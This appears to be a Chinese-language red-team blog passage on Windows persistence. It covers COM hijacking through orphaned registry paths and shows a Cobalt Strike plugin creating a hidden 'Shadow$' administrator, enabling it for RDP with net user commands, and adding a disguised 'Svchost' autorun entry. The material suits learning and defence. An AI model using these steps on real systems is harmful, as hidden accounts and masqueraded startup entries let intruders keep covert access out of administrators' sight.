> 一种常见的COM劫持方法是，将恶意DLL或者EXE文件放置到废弃的COM组件引用路径中。当COM组件通过正常系统调用执行时，攻击者的恶意代码就会被执行

`com` 注册表读取顺序：

```
HKEY_CURRENT_USER\Software\Classes\CLSID
HKEY_CLASSES_ROOT\CLSID
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\
```

注册表中，LocalServer32键表示可执行（exe）文件的路径、InprocServer32键表示动态链接库（DLL）文件的路径

劫持原理：
> 一种常见的COM劫持方法是，将恶意DLL或者EXE文件放置到废弃的COM组件引用路径中。当COM组件通过正常系统调用执行时，攻击者的恶意代码就会被执行
实现原理：
1.枚举所有LocalServer32和InprocServer32值（路径）
2.标准化二进制路径以删除参数等信息
3.验证二进制路径是否存在并定位丢失的文件

当某些软件注册COM组件在卸载时未及时清楚注册表中的组件，便可以通过在该注册路径上直接写入对应COM组件的恶意DLL文件


工具地址：

https://github.com/nickvourd/COM-Hunter

https://github.com/earthmanET/COM-Hijacker



## 工具

工具推荐：https://github.com/lintstar/LSTAR

这是一款CS的插件，里面集成了部分权限维持的功能，下面我们来简单部分测试两个：

![image-20220802202445685](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802202445685.png)

**影子用户创建**，

点击确定后，这里显示 

```
[*] RDP is already enabled
[+] RDP Port: 3389
[*] ShadowUser Created Successfully
[+] CloneUser: Administrator
[+] Username: Shadow$
[+] Password: DwfsLBXP4X
```

![image-20220802204315091](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802204315091.png)

我们通过目标机器的管理用户,以及`net user` 确认 一下.

![image-20220802205044529](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802205044529.png)

![image-20220802204520619](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802204520619.png)

可以看到在`管理其他用户`处并没有显示`shadow$用户`,并且使用 `net user` 也看不到用户 `shadow$` 的,但是使用 `net user shadow$`却是能够看到用户存在,但是此账户默认是没有激活的,所以我们还需要使用命令进行账户激活.

```
net user shadow$ /active:yes
```

并将用户添加到 `远程桌面组`:

```
net localgroup "remote desktop Users" shadow$ /add
```

远程桌面连接,发现可行!

![image-20220802205924354](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802205924354.png)



**添加启动项**

这里我创建了一个名为 `Svchost` 的开机启动项,默认启动`C:\Windows\system32\calc.exe`.

![image-20220802210423008](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802210423008.png)

通过cs的交互界面,我们看到他也就执行了一个`reg add `  的命令,回到机器,我们查看一下对应位置.

![image-20220802210629124](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802210629124.png)

可以看到,的确创建成功.

![image-20220802210848222](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220802210848222.png)



其余功能大家可以自行操作探索,这里就不在演示了.

have fun!

# 参考

[Windows ADS在渗透测试中的妙用](https://www.freebuf.com/articles/endpoint/195721.html)

[隐藏用户的创建和使用](https://cloud.tencent.com/developer/news/832146)

[渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F)

[一文打尽 Linux/Windows 端口复用实战](https://www.anquanke.com/post/id/230090#h2-8)

[一条命令实现端口复用后门](https://paper.seebug.org/1004/)

[ATT&CK之后门持久化（一）](https://mp.weixin.qq.com/s?__biz=Mzg3MDAzMDQxNw==&mid=2247487197&idx=1&sn=04f50a227add0d661d3d3bb82a64c97a&scene=21#wechat_redirect)

[ATT&CK之后门持久化（二）](https://mp.weixin.qq.com/s?__biz=Mzg3MDAzMDQxNw==&mid=2247487197&idx=2&sn=b3e074ea7c524e78a964d5e899486a50&scene=21#wechat_redirect)

[滥用COM：COM组件劫持](https://earthmanet.github.io/posts/2021/02/%E6%BB%A5%E7%94%A8comcom%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81/)

[COM组件劫持](https://www.crisprx.top/archives/477)